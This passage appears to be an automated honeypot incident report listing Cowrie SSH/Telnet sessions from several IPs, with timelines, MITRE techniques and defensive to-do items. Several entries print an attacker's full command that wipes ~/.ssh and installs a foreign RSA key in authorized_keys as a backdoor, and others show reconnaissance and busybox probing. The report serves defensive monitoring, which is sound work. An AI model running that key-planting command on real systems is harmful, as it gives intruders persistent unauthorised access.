| `2026-03-17 03:12:52` | `cowrie.login.success` |
| `2026-03-17 03:12:52` | `cowrie.session.params` |
| `2026-03-17 03:12:52` | `cowrie.command.input` |
| `2026-03-17 03:12:53` | `cowrie.log.closed` |
| `2026-03-17 03:12:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.135[.]43` to AbuseIPDB if not already reported
- [ ] Block `159.223.135[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8dfe57f22d3

| Field | Detail |
|---|---|
| **Source IP** | `159.223.135[.]43` |
| **First Seen** | 2026-03-17 03:13 |
| **Last Seen** | 2026-03-17 03:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 03:13:10` | `cowrie.session.connect` |
| `2026-03-17 03:13:10` | `cowrie.client.version` |
| `2026-03-17 03:13:11` | `cowrie.client.kex` |
| `2026-03-17 03:13:11` | `cowrie.login.success` |
| `2026-03-17 03:13:12` | `cowrie.session.params` |
| `2026-03-17 03:13:12` | `cowrie.command.input` |
| `2026-03-17 03:13:12` | `cowrie.log.closed` |
| `2026-03-17 03:13:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.135[.]43` to AbuseIPDB if not already reported
- [ ] Block `159.223.135[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6307ee81d4d9

| Field | Detail |
|---|---|
| **Source IP** | `159.223.135[.]43` |
| **First Seen** | 2026-03-17 03:13 |
| **Last Seen** | 2026-03-17 03:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 03:13:23` | `cowrie.session.connect` |
| `2026-03-17 03:13:23` | `cowrie.client.version` |
| `2026-03-17 03:13:23` | `cowrie.client.kex` |
| `2026-03-17 03:13:24` | `cowrie.login.success` |
| `2026-03-17 03:13:24` | `cowrie.session.params` |
| `2026-03-17 03:13:24` | `cowrie.command.input` |
| `2026-03-17 03:13:24` | `cowrie.log.closed` |
| `2026-03-17 03:13:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.135[.]43` to AbuseIPDB if not already reported
- [ ] Block `159.223.135[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df2b91d6a512

| Field | Detail |
|---|---|
| **Source IP** | `159.223.135[.]43` |
| **First Seen** | 2026-03-17 03:14 |
| **Last Seen** | 2026-03-17 03:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 03:14:07` | `cowrie.session.connect` |
| `2026-03-17 03:14:07` | `cowrie.client.version` |
| `2026-03-17 03:14:07` | `cowrie.client.kex` |
| `2026-03-17 03:14:08` | `cowrie.login.success` |
| `2026-03-17 03:14:08` | `cowrie.session.params` |
| `2026-03-17 03:14:08` | `cowrie.command.input` |
| `2026-03-17 03:14:09` | `cowrie.log.closed` |
| `2026-03-17 03:14:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.135[.]43` to AbuseIPDB if not already reported
- [ ] Block `159.223.135[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ee7450b8628

| Field | Detail |
|---|---|
| **Source IP** | `159.223.135[.]43` |
| **First Seen** | 2026-03-17 03:14 |
| **Last Seen** | 2026-03-17 03:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 03:14:26` | `cowrie.session.connect` |
| `2026-03-17 03:14:26` | `cowrie.client.version` |
| `2026-03-17 03:14:26` | `cowrie.client.kex` |
| `2026-03-17 03:14:27` | `cowrie.login.success` |
| `2026-03-17 03:14:27` | `cowrie.session.params` |
| `2026-03-17 03:14:27` | `cowrie.command.input` |
| `2026-03-17 03:14:27` | `cowrie.log.closed` |
| `2026-03-17 03:14:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.135[.]43` to AbuseIPDB if not already reported
- [ ] Block `159.223.135[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80671c73e605

| Field | Detail |
|---|---|
| **Source IP** | `159.223.135[.]43` |
| **First Seen** | 2026-03-17 03:15 |
| **Last Seen** | 2026-03-17 03:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 03:15:10` | `cowrie.session.connect` |
| `2026-03-17 03:15:10` | `cowrie.client.version` |
| `2026-03-17 03:15:10` | `cowrie.client.kex` |
| `2026-03-17 03:15:11` | `cowrie.login.success` |
| `2026-03-17 03:15:11` | `cowrie.session.params` |
| `2026-03-17 03:15:11` | `cowrie.command.input` |
| `2026-03-17 03:15:11` | `cowrie.log.closed` |
| `2026-03-17 03:15:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.135[.]43` to AbuseIPDB if not already reported
- [ ] Block `159.223.135[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37056f9678d4

| Field | Detail |
|---|---|
| **Source IP** | `159.223.135[.]43` |
| **First Seen** | 2026-03-17 03:16 |
| **Last Seen** | 2026-03-17 03:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 03:16:06` | `cowrie.session.connect` |
| `2026-03-17 03:16:06` | `cowrie.client.version` |
| `2026-03-17 03:16:06` | `cowrie.client.kex` |
| `2026-03-17 03:16:07` | `cowrie.login.success` |
| `2026-03-17 03:16:07` | `cowrie.session.params` |
| `2026-03-17 03:16:07` | `cowrie.command.input` |
| `2026-03-17 03:16:08` | `cowrie.log.closed` |
| `2026-03-17 03:16:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.135[.]43` to AbuseIPDB if not already reported
- [ ] Block `159.223.135[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-262f830fa494

| Field | Detail |
|---|---|
| **Source IP** | `159.223.135[.]43` |
| **First Seen** | 2026-03-17 03:17 |
| **Last Seen** | 2026-03-17 03:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 03:17:08` | `cowrie.session.connect` |
| `2026-03-17 03:17:08` | `cowrie.client.version` |
| `2026-03-17 03:17:09` | `cowrie.client.kex` |
| `2026-03-17 03:17:09` | `cowrie.login.success` |
| `2026-03-17 03:17:10` | `cowrie.session.params` |
| `2026-03-17 03:17:10` | `cowrie.command.input` |
| `2026-03-17 03:17:10` | `cowrie.log.closed` |
| `2026-03-17 03:17:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.135[.]43` to AbuseIPDB if not already reported
- [ ] Block `159.223.135[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-524fe72ef42e

| Field | Detail |
|---|---|
| **Source IP** | `47.239.235[.]46` |
| **First Seen** | 2026-03-17 03:21 |
| **Last Seen** | 2026-03-17 03:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 03:21:43` | `cowrie.session.connect` |
| `2026-03-17 03:21:43` | `cowrie.client.version` |
| `2026-03-17 03:21:43` | `cowrie.client.kex` |
| `2026-03-17 03:21:43` | `cowrie.login.success` |
| `2026-03-17 03:21:43` | `cowrie.session.params` |
| `2026-03-17 03:21:43` | `cowrie.command.input` |
| `2026-03-17 03:21:43` | `cowrie.command.failed` |
| `2026-03-17 03:21:44` | `cowrie.log.closed` |
| `2026-03-17 03:21:44` | `cowrie.session.params` |
| `2026-03-17 03:21:44` | `cowrie.command.input` |
| `2026-03-17 03:21:44` | `cowrie.session.file_download` |
| `2026-03-17 03:21:44` | `cowrie.log.closed` |
| `2026-03-17 03:21:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.239.235[.]46` to AbuseIPDB if not already reported
- [ ] Block `47.239.235[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-557a431a874e

| Field | Detail |
|---|---|
| **Source IP** | `47.239.235[.]46` |
| **First Seen** | 2026-03-17 03:21 |
| **Last Seen** | 2026-03-17 03:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 03:21:46` | `cowrie.session.connect` |
| `2026-03-17 03:21:46` | `cowrie.client.version` |
| `2026-03-17 03:21:46` | `cowrie.client.kex` |
| `2026-03-17 03:21:46` | `cowrie.login.success` |
| `2026-03-17 03:21:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.239.235[.]46` to AbuseIPDB if not already reported
- [ ] Block `47.239.235[.]46` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9802aeaeb202

| Field | Detail |
|---|---|
| **Source IP** | `47.239.235[.]46` |
| **First Seen** | 2026-03-17 03:23 |
| **Last Seen** | 2026-03-17 03:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 03:23:22` | `cowrie.session.connect` |
| `2026-03-17 03:23:22` | `cowrie.client.version` |
| `2026-03-17 03:23:22` | `cowrie.client.kex` |
| `2026-03-17 03:23:22` | `cowrie.login.success` |
| `2026-03-17 03:23:22` | `cowrie.session.params` |
| `2026-03-17 03:23:22` | `cowrie.command.input` |
| `2026-03-17 03:23:22` | `cowrie.command.failed` |
| `2026-03-17 03:23:22` | `cowrie.log.closed` |
| `2026-03-17 03:23:23` | `cowrie.session.params` |
| `2026-03-17 03:23:23` | `cowrie.command.input` |
| `2026-03-17 03:23:23` | `cowrie.session.file_download` |
| `2026-03-17 03:23:23` | `cowrie.log.closed` |
| `2026-03-17 03:23:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.239.235[.]46` to AbuseIPDB if not already reported
- [ ] Block `47.239.235[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfd6dfa5e05f

| Field | Detail |
|---|---|
| **Source IP** | `47.239.235[.]46` |
| **First Seen** | 2026-03-17 03:23 |
| **Last Seen** | 2026-03-17 03:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 03:23:25` | `cowrie.session.connect` |
| `2026-03-17 03:23:25` | `cowrie.client.version` |
| `2026-03-17 03:23:25` | `cowrie.client.kex` |
| `2026-03-17 03:23:25` | `cowrie.login.success` |
| `2026-03-17 03:23:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.239.235[.]46` to AbuseIPDB if not already reported
- [ ] Block `47.239.235[.]46` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02553ecc8840

| Field | Detail |
|---|---|
| **Source IP** | `47.239.235[.]46` |
| **First Seen** | 2026-03-17 03:23 |
| **Last Seen** | 2026-03-17 03:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 03:23:50` | `cowrie.session.connect` |
| `2026-03-17 03:23:50` | `cowrie.client.version` |
| `2026-03-17 03:23:50` | `cowrie.client.kex` |
| `2026-03-17 03:23:51` | `cowrie.login.success` |
| `2026-03-17 03:23:51` | `cowrie.session.params` |
| `2026-03-17 03:23:51` | `cowrie.command.input` |
| `2026-03-17 03:23:51` | `cowrie.command.failed` |
| `2026-03-17 03:23:51` | `cowrie.log.closed` |
| `2026-03-17 03:23:51` | `cowrie.session.params` |
| `2026-03-17 03:23:51` | `cowrie.command.input` |
| `2026-03-17 03:23:51` | `cowrie.session.file_download` |
| `2026-03-17 03:23:51` | `cowrie.log.closed` |
| `2026-03-17 03:23:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.239.235[.]46` to AbuseIPDB if not already reported
- [ ] Block `47.239.235[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ad35b2f81c2

| Field | Detail |
|---|---|
| **Source IP** | `47.239.235[.]46` |
| **First Seen** | 2026-03-17 03:23 |
| **Last Seen** | 2026-03-17 03:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 03:23:53` | `cowrie.session.connect` |
| `2026-03-17 03:23:53` | `cowrie.client.version` |
| `2026-03-17 03:23:53` | `cowrie.client.kex` |
| `2026-03-17 03:23:54` | `cowrie.login.success` |
| `2026-03-17 03:23:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.239.235[.]46` to AbuseIPDB if not already reported
- [ ] Block `47.239.235[.]46` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c790b69f20c

| Field | Detail |
|---|---|
| **Source IP** | `112.184.45[.]204` |
| **First Seen** | 2026-03-17 03:47 |
| **Last Seen** | 2026-03-17 03:48 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 03:47:50` | `cowrie.session.connect` |
| `2026-03-17 03:47:51` | `cowrie.client.version` |
| `2026-03-17 03:47:51` | `cowrie.client.kex` |
| `2026-03-17 03:47:54` | `cowrie.login.success` |
| `2026-03-17 03:47:55` | `cowrie.direct-tcpip.request` |
| `2026-03-17 03:48:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.184.45[.]204` to AbuseIPDB if not already reported
- [ ] Block `112.184.45[.]204` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2c45f863727

| Field | Detail |
|---|---|
| **Source IP** | `46.39.251[.]94` |
| **First Seen** | 2026-03-17 04:13 |
| **Last Seen** | 2026-03-17 04:16 |
| **Session Duration** | 181s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `enable, system, shell, sh, cat /proc/mounts; /bin/busybox LRTPW` |
| **Download Attempts** | e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff |
| **Malware Analysis** | e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff (LOW) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1105 · T1110.001 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 04:13:38` | `cowrie.session.connect` |
| `2026-03-17 04:13:38` | `cowrie.telnet.option` |
| `2026-03-17 04:13:38` | `cowrie.login.failed` |
| `2026-03-17 04:13:39` | `cowrie.telnet.option` |
| `2026-03-17 04:13:39` | `cowrie.login.success` |
| `2026-03-17 04:13:39` | `cowrie.session.params` |
| `2026-03-17 04:13:39` | `cowrie.command.input` |
| `2026-03-17 04:13:39` | `cowrie.command.input` |
| `2026-03-17 04:13:39` | `cowrie.command.failed` |
| `2026-03-17 04:13:39` | `cowrie.command.input` |
| `2026-03-17 04:13:39` | `cowrie.command.failed` |
| `2026-03-17 04:13:39` | `cowrie.command.input` |
| `2026-03-17 04:13:39` | `cowrie.command.input` |
| `2026-03-17 04:13:39` | `cowrie.command.input` |
| `2026-03-17 04:13:40` | `cowrie.command.input` |
| `2026-03-17 04:13:40` | `cowrie.command.input` |
| `2026-03-17 04:13:40` | `cowrie.command.failed` |
| `2026-03-17 04:13:40` | `cowrie.command.input` |
| `2026-03-17 04:13:40` | `cowrie.command.input` |
| `2026-03-17 04:13:40` | `cowrie.command.input` |
| `2026-03-17 04:16:39` | `cowrie.session.file_download` |
| `2026-03-17 04:16:39` | `cowrie.log.closed` |
| `2026-03-17 04:16:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.39.251[.]94` to AbuseIPDB if not already reported
- [ ] Block `46.39.251[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-988ca233deea

| Field | Detail |
|---|---|
| **Source IP** | `23.97.62[.]151` |
| **First Seen** | 2026-03-17 04:46 |
| **Last Seen** | 2026-03-17 04:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 04:46:58` | `cowrie.session.connect` |
| `2026-03-17 04:46:58` | `cowrie.client.version` |
| `2026-03-17 04:46:58` | `cowrie.client.kex` |
| `2026-03-17 04:46:58` | `cowrie.login.success` |
| `2026-03-17 04:46:59` | `cowrie.session.params` |
| `2026-03-17 04:46:59` | `cowrie.command.input` |
| `2026-03-17 04:46:59` | `cowrie.log.closed` |
| `2026-03-17 04:46:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.97.62[.]151` to AbuseIPDB if not already reported
- [ ] Block `23.97.62[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-965608874652

| Field | Detail |
|---|---|
| **Source IP** | `41.216.177[.]55` |
| **First Seen** | 2026-03-17 04:59 |
| **Last Seen** | 2026-03-17 04:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 04:59:04` | `cowrie.session.connect` |
| `2026-03-17 04:59:04` | `cowrie.client.version` |
| `2026-03-17 04:59:05` | `cowrie.client.kex` |
| `2026-03-17 04:59:05` | `cowrie.login.success` |
| `2026-03-17 04:59:06` | `cowrie.session.params` |
| `2026-03-17 04:59:06` | `cowrie.command.input` |
| `2026-03-17 04:59:06` | `cowrie.command.failed` |
| `2026-03-17 04:59:06` | `cowrie.log.closed` |
| `2026-03-17 04:59:06` | `cowrie.session.params` |
| `2026-03-17 04:59:06` | `cowrie.command.input` |
| `2026-03-17 04:59:06` | `cowrie.session.file_download` |
| `2026-03-17 04:59:06` | `cowrie.log.closed` |
| `2026-03-17 04:59:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.216.177[.]55` to AbuseIPDB if not already reported
- [ ] Block `41.216.177[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c038261a8f0

| Field | Detail |
|---|---|
| **Source IP** | `41.216.177[.]55` |
| **First Seen** | 2026-03-17 04:59 |
| **Last Seen** | 2026-03-17 04:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 04:59:09` | `cowrie.session.connect` |
| `2026-03-17 04:59:09` | `cowrie.client.version` |
| `2026-03-17 04:59:09` | `cowrie.client.kex` |
| `2026-03-17 04:59:09` | `cowrie.login.success` |
| `2026-03-17 04:59:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.216.177[.]55` to AbuseIPDB if not already reported
- [ ] Block `41.216.177[.]55` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d15f86149f78

| Field | Detail |
|---|---|
| **Source IP** | `103.56.30[.]33` |
| **First Seen** | 2026-03-17 05:00 |
| **Last Seen** | 2026-03-17 05:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 05:00:08` | `cowrie.session.connect` |
| `2026-03-17 05:00:08` | `cowrie.client.version` |
| `2026-03-17 05:00:08` | `cowrie.client.kex` |
| `2026-03-17 05:00:08` | `cowrie.login.success` |
| `2026-03-17 05:00:08` | `cowrie.session.params` |
| `2026-03-17 05:00:08` | `cowrie.command.input` |
| `2026-03-17 05:00:08` | `cowrie.command.failed` |
| `2026-03-17 05:00:08` | `cowrie.log.closed` |
| `2026-03-17 05:00:09` | `cowrie.session.params` |
| `2026-03-17 05:00:09` | `cowrie.command.input` |
| `2026-03-17 05:00:09` | `cowrie.session.file_download` |
| `2026-03-17 05:00:09` | `cowrie.log.closed` |
| `2026-03-17 05:00:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.56.30[.]33` to AbuseIPDB if not already reported
